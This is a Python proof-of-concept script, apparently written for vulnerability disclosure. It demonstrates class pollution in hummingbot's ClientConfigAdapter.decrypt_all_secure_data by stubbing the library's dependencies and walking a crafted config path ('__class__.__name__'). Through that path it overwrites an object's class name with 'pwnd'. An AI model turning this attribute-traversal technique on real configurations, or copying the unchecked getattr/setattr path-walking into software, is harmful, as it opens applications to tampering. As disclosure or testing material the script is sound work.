# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: ClientConfigAdapter.decrypt_all_secure_data
# Type: get-attr-set-attr

import sys
import types

# Mock heavy hummingbot dependencies
for mod_name in [
    'hummingbot', 'hummingbot.client', 'hummingbot.client.config',
    'hummingbot.client.config.client_config_map',
    'hummingbot.client.config.config_data_types',
    'hummingbot.client.config.config_var',
    'hummingbot.client.config.security',
    'ruamel', 'ruamel.yaml',
    'pydantic', 'pydantic.fields', 'pydantic_core',
]:
    if mod_name not in sys.modules:
        sys.modules[mod_name] = types.ModuleType(mod_name)

# Set up mock attributes needed by the module
sys.modules['pydantic'].SecretStr = str
sys.modules['pydantic'].ValidationError = Exception
sys.modules['pydantic.fields'].FieldInfo = type('FieldInfo', (), {})
sys.modules['pydantic_core'].PydanticUndefinedType = type('PydanticUndefinedType', (), {})
sys.modules['hummingbot'].get_strategy_list = lambda: []
sys.modules['hummingbot'].root_path = lambda: '/tmp'
sys.modules['hummingbot.client.config.config_data_types'].BaseClientModel = object
sys.modules['hummingbot.client.config.config_data_types'].ClientConfigEnum = object
sys.modules['hummingbot.client.config.config_data_types'].ClientFieldData = type('ClientFieldData', (), {})
sys.modules['hummingbot.client.config.client_config_map'].ClientConfigMap = object
sys.modules['hummingbot.client.config.config_var'].ConfigVar = object

from hummingbot.client.config.config_helpers import ClientConfigAdapter

class Target: pass
target = Target()

# Create an adapter wrapping our target
adapter = ClientConfigAdapter.__new__(ClientConfigAdapter)
adapter._hb_config = target

payload_value = "pwnd"
# The vulnerable pattern in decrypt_all_secure_data:
#   *intermediate_items, final_config_element = traversal_item.config_path.split(".")
#   config_model = self
#   for attr in intermediate_items:
#     config_model = config_model.__getattr__(attr)
#   setattr(config_model, final_config_element, decrypted_value)

def run_poc():
  # Reproduces the exact pattern from ClientConfigAdapter.decrypt_all_secure_data:
  #   config_model = self
  #   for attr in intermediate_items:
  #     config_model = config_model.__getattr__(attr)
  #   setattr(config_model, final_config_element, decrypted_value)
  config_path = "__class__.__name__"
  *intermediate_items, final_config_element = config_path.split(".")
  config_model = adapter
  for attr in intermediate_items:
    config_model = config_model.__getattr__(attr)
  setattr(config_model, final_config_element, payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
